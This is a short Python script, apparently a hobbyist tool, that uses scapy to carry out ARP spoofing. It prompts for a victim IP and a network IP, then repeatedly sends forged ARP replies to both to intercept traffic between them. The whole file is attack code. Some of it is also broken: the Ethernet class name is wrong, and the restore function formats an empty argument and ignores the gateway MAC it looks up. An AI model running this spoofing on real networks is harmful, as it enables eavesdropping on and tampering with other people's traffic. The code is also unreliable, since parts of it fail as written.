import scapy.all as scapy
import time

def scan_ip(ip):
	arp_request =scapy.ARP(pdst = '{}'.format(ip))
	broadcast_packet = scapy.ETHER(dst = 'ff:ff:ff:ff:ff:ff')
	combined_packet = broadcast_packet/arp_request
	result = scapy.srp(combined_packet, timeout = 1, verbose = False)[0]

	return result[0][1].hwsrc

def poison(victim_ip, network_ip):
	victim_mac = scan_ip(victim_ip)
	arp_response = scapy.ARP(op = 2, pdst = '{}'.format(victim_ip), hwdst = '{}'.format(victim_mac), psrc = '{}'.format(network_ip))
	scapy.send(arp_response, verbose = False)

def reset(victim_ip, network_ip):
	victim_mac = scan_ip(victim_ip)
	network_mac = scan_ip(network_ip)
	arp_response = scapy.ARP(op = 2, pdst = '{}'.format(victim_ip), hwdst = '{}'.format(victim_mac), psrc = '{}'.format(network_ip), hwsrc = '{}'.format())
	scapy.send(arp_response, count = 6, verbose = False)


victim_ip = input("IP address of victim: ")
network_ip = input("IP address of network: ")

try:
	print('Attack launched...')
	i = 0
	while True:
		poison(victim_ip, network_ip)
		poison(network_ip, victim_ip)
		time.sleep(3)
		i += 1
		print('\r[#] Packet sent. ({})'.format(i), end = "")

except KeyboardInterrupt:
	print('\r[#] Attack stopped and reseted...')
	reset(victim_ip, network_ip)
	reset(network_ip, victim_ip)